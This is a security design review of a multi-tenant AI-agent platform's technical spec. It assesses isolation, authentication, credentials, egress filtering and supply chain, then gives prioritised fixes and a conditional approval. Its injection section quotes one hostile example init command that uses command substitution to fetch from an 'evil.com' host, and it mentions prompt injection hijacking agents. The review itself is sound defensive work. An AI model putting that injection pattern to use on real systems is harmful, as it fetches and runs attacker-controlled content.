---
persona: security-engineer
date: 2026-02-08
artifact: docs/plans/2026-02-07-kani-tech-spec.md
scope: Security review of multi-tenant AI agent platform covering threat model, isolation, auth, encryption, injection vectors, and supply chain
sign-off: conditional-approve
confidence: high
---

## Summary

This review evaluates the Kani v4 technical specification from a security perspective, focusing on multi-tenant isolation, authentication and authorization, credential lifecycle, network security, injection attack surfaces, supply chain integrity, and audit/forensic readiness. The headline finding is that the specification demonstrates a mature, defense-in-depth security posture with strong isolation primitives (gVisor, RLS, per-namespace NetworkPolicy, DNS-based egress filtering), but has several gaps that must be addressed before production: the single API key per tenant model creates an unacceptable blast radius for key compromise, the `init_commands` feature introduces a command injection surface that needs stronger guardrails, and the pod auth token validation path has a potential TOCTOU race that could allow stale tokens to authorize requests during pod replacement.

## Analysis

### Tenant Isolation Model

The isolation architecture is well-layered and follows defense-in-depth principles:

1. **Database layer**: Postgres Row-Level Security (RLS) with `SET LOCAL app.current_tenant_id` per transaction. The spec correctly notes that the management server connects as a non-owner, non-superuser role (`kani_app`), which prevents silent RLS bypass. This is a strong control -- even if application code has a bug that omits a `WHERE tenant_id = ?` clause, the database enforces isolation.

2. **Kubernetes layer**: Per-tenant namespaces with Pod Security Admission (`restricted`), RBAC, ResourceQuotas, and NetworkPolicies. The spec includes deny-all egress as the default, which is the correct starting posture.

3. **Runtime layer**: gVisor in ptrace mode provides user-space syscall interception. The spec acknowledges the ptrace-vs-KVM tradeoff and documents the mitigation (other defense-in-depth layers). This is a reasonable v1 decision.

4. **Filesystem layer**: EFS Access Points with enforced UID/GID and root directory jailing. The `nosuid`, `nodev`, and `nosymfollow` mount options are appropriate. The decision to omit `noexec` is documented with rationale (agents need to execute scripts) and mitigated by gVisor.

**Concern**: The spec states that "Multiple instances can mount the same filesystem (each via the same Access Point)" and that "Concurrency control is the user's responsibility." While this is a stated design choice, it means two instances belonging to the same tenant can read and write the same files. If one instance is compromised (e.g., via prompt injection), it can tamper with files visible to other instances on the same filesystem. The Access Point uses a shared UID/GID per filesystem, so there is no file-level isolation between instances sharing a filesystem. This is a known blast radius concern within a single tenant's scope.

### Authentication and Authorization

**API key model**: The v1 single-key-per-tenant model is the most significant security concern. Every holder of a tenant's API key has full access to all resources (filesystems, instances, credentials, messages). The blast radius of a single compromised key is total compromise of the tenant. The spec acknowledges this and plans scoped keys for v1.1, but launching with a single key model means:

- No ability to grant read-only access to monitoring systems.
- No ability to scope keys to specific instances.
- No ability to distinguish which key performed an action (there is only one key).
- Key rotation (`POST /tenant/rotate-key`) invalidates the old key immediately and terminates active SSE connections, which is correct but creates an operational disruption that may discourage regular rotation.

**API key hashing**: argon2id is the correct choice for API key hashing. The spec states the raw key is shown once at creation, which is standard practice.

**SSE token model**: The short-lived (5-minute) SSE token approach avoids putting API keys in query parameters, which is good (query params appear in server logs, CDN logs, browser history). The multi-use within TTL is a reasonable tradeoff for reconnection. Tokens are invalidated on key rotation, which is correct.

**Pod auth tokens**: 256-bit cryptographically random tokens stored as SHA-256 hashes in Postgres. The validation path (hash the presented token, lookup, verify `invalidated_at IS NULL`) is sound. However, there is a potential TOCTOU (time-of-check-time-of-use) race: if a pod is being destroyed while a message is being validated, the token could be invalidated between the validation check and the actual message delivery. The spec does not describe how this race is handled. Given that the fast-path fallback already handles delivery failures (falls back to Temporal signal), the practical impact may be low, but the race should be documented.

**Admin API authentication**: The spec states admin keys are "provisioned out-of-band" but does not specify the authentication mechanism, storage, rotation procedure, or whether admin keys support scoping. This is a gap.

### Credential Security

The file-mount approach (not environment variables) is a strong choice that eliminates several common leakage vectors (`/proc/environ`, child process inheritance, crash dumps). The spec correctly identifies the known limitation: the agent process can read credentials from disk and exfiltrate them via allowed egress domains.

**Credential storage flow**: Raw credential value goes directly to Kubernetes Secret, never stored in Postgres. This is correct -- it avoids doubling the attack surface.

**etcd encryption**: The spec requires `EncryptionConfiguration` with a KMS provider for K8s Secrets at rest. This is necessary and appropriate.

**Credential rotation**: The `PUT /credentials/:id` endpoint updates the K8s Secret in place and restarts affected pods with a concurrency limit of 5. The `?emergency=true` flag kills all pods immediately. This is well-thought-out. However, the spec does not describe what happens if the K8s Secret update succeeds but some pod restarts fail -- is the credential partially rotated? Pods that did not restart would still have the old credential mounted. The spec should address this partial-rotation scenario.

**Credential file permissions**: Mode 0440 with a shared group for kani-agent (UID 1000) and agent process (UID 1001). This is acceptable for v1 given that both processes need read access. The credential proxy in v1.1 is the correct long-term fix.

### Network Security and Egress Control

The DNS-based egress filtering is creative and well-architected. By controlling DNS resolution at the namespace level, agents cannot resolve unauthorized domains, and the deny-all NetworkPolicy prevents direct IP connections that bypass DNS.

**Strengths**:
- Per-namespace CoreDNS with explicit allowlists.
- DNS query logging for anomaly detection (DNS tunneling).
- Cloud metadata endpoints explicitly blocked (169.254.169.254, fd00:ec2::254, GCP/Azure equivalents).
- Kubernetes API server blocked from tenant pods.
- Same-namespace pod-to-pod traffic denied.
- RFC 1918 and link-local addresses blocked except EFS mount targets.

**Gap -- DNS rebinding**: The spec does not address DNS rebinding attacks. An attacker could configure a domain on the allowlist to temporarily resolve to an internal IP address (e.g., the metadata endpoint, an internal service). While the NetworkPolicy blocks RFC 1918 and link-local addresses, the allowlist controls which domains can be resolved, not the IPs they resolve to. If an allowed domain (e.g., `api.anthropic.com`) were compromised at the DNS level to point to an internal IP, the NetworkPolicy would still block it (because the internal IPs are blocked). However, the spec should explicitly document this interaction and verify that the NetworkPolicy block on internal IPs applies to all resolved IPs, not just direct IP connections.

**Gap -- IP-based allowlist rules**: The spec mentions that NetworkPolicy allows "Resolved IPs from allowed domains (HTTPS port 443)." It is unclear how this is implemented. Kubernetes NetworkPolicy does not natively support FQDN-based egress rules. The spec may be relying on the fact that only allowlisted domains can be resolved (so only their IPs can be connected to), but NetworkPolicy egress rules are typically IP/CIDR-based. If the egress rule is permissive (e.g., allow all TCP 443 to 0.0.0.0/0) with the expectation that DNS filtering is sufficient, then a pod that hard-codes an external IP can bypass DNS filtering entirely. This needs clarification.

**Gap -- CoreDNS as a single point of enforcement**: If an attacker gains the ability to modify the CoreDNS ConfigMap (e.g., by compromising the management server or exploiting a Kubernetes RBAC misconfiguration), they can add any domain to the allowlist. The ConfigMap update path should be audit-logged and restricted to the management server service account only.

### Injection Vectors

**`init_commands`**: This is the most concerning injection surface. The spec states: "Init commands run as the agent user with the same filesystem mount and network policy." The commands are stored as a JSON list of strings and executed "sequentially in the workspace directory." The execution mechanism is `kubectl exec` from the `RunInitCommands` activity.

Key questions:
- Are the commands executed via a shell (`/bin/sh -c "command"`) or via direct exec? If via shell, shell metacharacters in user-provided commands could cause injection. Example: a user stores `["git clone $(curl evil.com) ."]` as an init command.
- Since the user provides these commands, they are by definition user-controlled code execution. The security boundary is therefore the network and filesystem isolation, not the command content itself. However, the spec should explicitly state that init commands are arbitrary user-provided code and that the isolation layers (gVisor, NetworkPolicy, EFS jailing) are the security controls, not input validation of the command strings.
- The `kubectl exec` execution from the management server to the pod means the management server needs RBAC permissions for `pods/exec` in tenant namespaces. This is a powerful permission. If the management server is compromised, the attacker can exec into any tenant pod.

**`agent_config` and `provider_config`**: The spec states these are validated against strict schemas. `provider_config` for EFS only accepts `storage_quota_gb` (integer). Agent plugins "must never construct shell commands from config values -- use `exec` syscall with explicit argument arrays." This is the correct guidance.

**Message content**: Validated as UTF-8 text, max 1MB. The spec does not discuss whether message content is sanitized before being written to the agent's stdin. Since the agent is Claude Code (which interprets natural language), the primary injection risk is prompt injection (manipulating the agent's behavior), not traditional input injection. This is outside the platform's control and is acknowledged by the threat model ("repository content or external data manipulates the agent into performing hostile actions").

**SSRF**: The spec addresses SSRF through schema validation of `provider_config` and `agent_config`. EFS filesystem IDs and mount targets are server-configured, never from user input. This is adequate for v1.

### Secrets in Logs and Errors

The spec explicitly states: "Message content is never logged. Log message IDs and metadata only." This is critical for a platform handling potentially sensitive code and conversations.

**Credential values**: Never stored in Postgres, only in K8s Secrets. The file-mount approach avoids environment variable leakage to logs.

**Error responses**: The standard error format includes `code`, `message`, and `details`. The spec does not explicitly state that error messages must not contain internal details (stack traces, internal IPs, SQL fragments). This should be documented as a requirement.

**Audit logs**: The spec calls for a dedicated, immutable audit log in append-only/WORM storage with 1-year minimum retention. This is strong. Audit events include appropriate fields (timestamp, actor, source IP, action, resource, result). The spec states audit logs are "PII redacted" on tenant deletion, which is correct for GDPR compliance.

### Supply Chain Security

The container image security controls are comprehensive:
- Images signed with cosign in CI/CD.
- Admission policy (Kyverno or OPA Gatekeeper) verifies signatures at pod creation.
- Image digests (`@sha256:...`) for immutability.
- Private registry with RBAC and audit logging.
- Agent binaries pinned to exact versions with checksum verification.
- Vulnerability scanning with blocking thresholds (no critical/high CVEs).

This is a strong supply chain posture. The one gap is that the spec does not mention base image update cadence. Container base images (OS layer) accumulate CVEs over time. A documented cadence for rebuilding images with updated base layers (e.g., weekly) would strengthen this.

### Encryption

- **At rest**: Postgres (RDS KMS), EFS (KMS), etcd (KMS via EncryptionConfiguration), Redis (ElastiCache encryption at rest). All covered.
- **In transit**: Postgres (`sslmode=verify-full`), Redis (TLS), EFS (TLS mount helper), kani-agent (TLS), Kubernetes API (TLS). All covered.
- **Key management**: KMS is used for RDS, EFS, and etcd. The spec does not discuss KMS key rotation policies. AWS KMS supports automatic annual rotation for customer-managed keys; this should be enabled.

The spec notes that mTLS is not required for kani-agent communication in v1, citing short pod lifetimes, gVisor isolation, and NetworkPolicy. This is a reasonable v1 tradeoff, but the pod auth token becomes the sole authentication mechanism for the kani-agent API. If an attacker within the cluster (but outside the tenant namespace) could forge or intercept a pod auth token, they could send arbitrary messages to a pod. The NetworkPolicy restricting port 8080 to management server pods is the primary control here.

### Rate Limiting and Abuse Prevention

- API rate limiting via Redis sliding window (sorted sets, MULTI/EXEC). Consistent across replicas.
- Per-IP rate limiting on authentication endpoints (20 failed attempts/minute/IP). This is good for brute-force prevention.
- Message queue depth limit (100 per instance) prevents resource exhaustion.
- Pod creation rate limit (10/minute) prevents rapid pod churn.

**Gap**: The spec does not mention rate limiting on credential operations. A compromised key could rapidly create and delete credentials, potentially causing churn in K8s Secrets and pod restarts. The concurrency limit of 5 on credential rotation restarts partially mitigates this, but the creation/deletion rate is unconstrained beyond the general API rate limit.

### Compliance Considerations

- **Data residency**: The spec does not discuss data residency or geographic constraints. For GDPR compliance, tenants may need guarantees that their data stays in specific regions. This may be a deployment-level concern, but the spec should acknowledge it.
- **Right to erasure**: The tenant deletion workflow (9 steps) is comprehensive. Audit logs are retained with PII redacted. The spec mentions "cryptographic erasure verification" as a future consideration. For v1, the deletion workflow combined with KMS-encrypted storage provides a reasonable basis (destroy the KMS key to render data unrecoverable), but this is not explicitly described.
- **Data processing agreements**: Out of scope for a tech spec, but the multi-tenant architecture means the platform operator is processing data for multiple tenants and should have appropriate agreements.

### Temporal Security

The spec uses Temporal Cloud, which eliminates self-hosted Temporal security concerns. However:

- The spec does not describe how the management server authenticates to Temporal Cloud (mTLS certificates, API keys, etc.) or how those credentials are managed.
- Temporal workflow history contains tenant operational data (message IDs, instance IDs, status transitions). The spec does not discuss Temporal data retention or purging. Completed workflow histories should be cleaned up on a schedule.
- If Temporal Cloud is compromised or has an outage that results in data exposure, workflow history could reveal tenant operational patterns. This is a residual risk with any managed service.

### Reconciliation Loop Security

The reconciliation loop runs on a single management server replica using Lease-based leader election. It has broad permissions: listing pods across all tenant namespaces, comparing to database state, cleaning up Redis streams, and polling storage usage. If the reconciliation loop has a bug, it could garbage-collect active pods (zombie pod detection false positive) or leak information across tenants (iterating all tenant namespaces).

The shared informer factory filtered by label `kani-managed=true` is appropriate, but the reconciliation loop should run with a dedicated service account that has only the specific RBAC permissions it needs (list/delete pods, list namespaces), not the full management server service account.

## Assumptions

- The spec references ADR documents (001-008) that were not available for this review. This review assumes the ADRs are consistent with the spec and do not introduce additional security concerns.
- The companion API spec (`docs/plans/kani-api-spec.md`) was not available. Input validation details, request/response schemas, and SSE event payload schemas referenced there are assumed to be adequate.
- The spec describes Kubernetes NetworkPolicy rules, but NetworkPolicy enforcement depends on the CNI plugin. This review assumes a CNI that fully supports NetworkPolicy (e.g., Calico, Cilium).
- "Kyverno or OPA Gatekeeper" for admission policies -- this review assumes whichever is chosen will be properly configured to verify cosign signatures on all pod creation events in tenant namespaces.
- The review assumes that the management server is deployed in the system namespace with appropriate hardening (not in a tenant namespace).
- The `kani_app` Postgres role is assumed to not be the table owner, as stated, so RLS cannot be bypassed.

## Recommendations

### P0 -- Must fix before proceeding

1. **Clarify NetworkPolicy egress implementation for allowed domains.** The spec states NetworkPolicy allows "Resolved IPs from allowed domains (HTTPS port 443)" but does not explain how this is implemented. Kubernetes NetworkPolicy does not natively support FQDN-based egress rules. If the actual implementation is a broad `allow TCP 443 to 0.0.0.0/0` rule relying solely on DNS filtering for enforcement, then any pod that hard-codes an external IP address (bypassing DNS) can reach arbitrary internet hosts. The spec must clarify whether: (a) a NetworkPolicy controller with FQDN support is used (e.g., Cilium), (b) the egress rule is indeed broad with DNS as the sole control (and document the residual risk of direct-IP connections), or (c) some other mechanism enforces IP-level egress restrictions. This is the single most critical security gap because it affects the entire tenant isolation model for network egress.

2. **Document admin API authentication and key management.** The spec states admin keys are "provisioned out-of-band" but does not describe: how admin keys are stored, rotated, or revoked; whether admin actions require MFA or IP-allowlisting; whether there are multiple admin keys with distinct identities; or the authentication mechanism (bearer token, mTLS, etc.). Admin API access grants the ability to create tenants, suspend accounts, and delete all data. This attack surface must be fully specified.

3. **Specify `init_commands` execution mechanism and security boundary.** The spec must document whether init commands are executed via a shell or direct exec. If via shell, document the command injection implications (and accept them, since init commands are user-provided code). Explicitly state that init commands are arbitrary code execution within the isolation boundary and that gVisor + NetworkPolicy + EFS jailing are the security controls. Also document the RBAC implications of the management server needing `pods/exec` permission in tenant namespaces.

### P1 -- Should fix before production

1. **Add error response sanitization requirement.** Document that error responses to clients must never contain internal implementation details (stack traces, SQL fragments, internal IP addresses, Temporal workflow IDs). Define a mapping from internal errors to user-facing error codes.

2. **Address partial credential rotation scenario.** Document the behavior when a credential K8s Secret is updated but subsequent pod restarts fail. Clarify whether pods that did not restart still serve with the old credential (and for how long) and what the operator remediation path is.

3. **Restrict reconciliation loop RBAC.** The reconciliation loop should use a dedicated service account with minimum necessary permissions (list/delete pods by label, read namespaces) rather than the full management server service account. This limits blast radius if the reconciliation loop has a bug.

4. **Document KMS key rotation policy.** Specify that AWS KMS customer-managed keys used for RDS, EFS, and etcd encryption must have automatic rotation enabled (annual minimum). Document the key rotation schedule.

5. **Add base image update cadence.** Document a policy for rebuilding container images with updated base layers (e.g., weekly) to address OS-level CVEs that accumulate between agent version bumps.

6. **Document Temporal Cloud authentication and data lifecycle.** Specify how the management server authenticates to Temporal Cloud, how those credentials are managed and rotated, and define a retention/purge policy for completed workflow histories.

7. **Address DNS rebinding risk explicitly.** Document that the NetworkPolicy blocks on internal IP ranges protect against DNS rebinding attacks where an allowed domain temporarily resolves to an internal IP. Add this to the threat model as a considered-and-mitigated risk.

8. **Harden CoreDNS ConfigMap update path.** Restrict RBAC for updating CoreDNS ConfigMaps to the management server service account only. Audit-log all ConfigMap changes in tenant namespaces. A compromised ConfigMap means a compromised egress allowlist.

### P2 -- Consider improving

1. **Add rate limiting for credential creation/deletion.** Beyond the general API rate limit, consider specific rate limits on credential lifecycle operations to prevent churn attacks that could cause excessive pod restarts and K8s Secret operations.

2. **Document data residency considerations.** Acknowledge GDPR and data residency requirements at the platform level, even if enforcement is a deployment-level concern. Tenants in regulated industries will ask.

3. **Consider short-lived pod auth tokens.** The current pod auth tokens are valid for the entire pod lifetime. Consider rotating them periodically (e.g., every hour) to limit the window of exposure if a token is leaked. This adds complexity but reduces blast radius.

4. **Document TOCTOU race in pod auth token validation.** The race between token invalidation during `DestroyPod` and concurrent message delivery should be documented. The fast-path fallback mitigates the practical impact, but the race should be acknowledged in the security model.

5. **Add cryptographic erasure to tenant deletion.** The spec lists this as a future consideration. For production launch, document how KMS key management interacts with tenant deletion (i.e., whether deleting the KMS key renders all tenant data unrecoverable, or whether shared KMS keys prevent per-tenant cryptographic erasure).

6. **Consider logging failed pod auth token validations.** Failed token validations (invalid token, invalidated token) should be logged as security events for anomaly detection, in addition to the existing authentication success/failure audit logging.

## Sign-Off

**conditional-approve** -- The specification demonstrates a strong, well-layered security architecture with defense-in-depth across database, Kubernetes, runtime, network, and filesystem boundaries. However, the NetworkPolicy egress implementation ambiguity (P0-1), the unspecified admin API authentication model (P0-2), and the undocumented `init_commands` execution security boundary (P0-3) must be resolved before this design is ready for implementation, as each could undermine a core isolation guarantee if incorrectly implemented.
